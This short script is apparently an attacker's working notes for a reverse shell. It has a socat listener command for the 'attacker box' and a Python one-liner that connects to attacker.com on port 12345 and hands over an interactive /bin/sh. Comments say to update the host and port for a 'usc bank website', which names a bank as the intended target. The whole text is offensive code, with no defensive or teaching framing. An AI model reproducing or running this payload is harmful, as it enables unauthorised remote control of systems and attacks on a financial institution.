#First run: socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.

export RHOST=attacker.com #update for usc bank website
export RPORT=12345 #update for usc bank
python -c 'import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")'
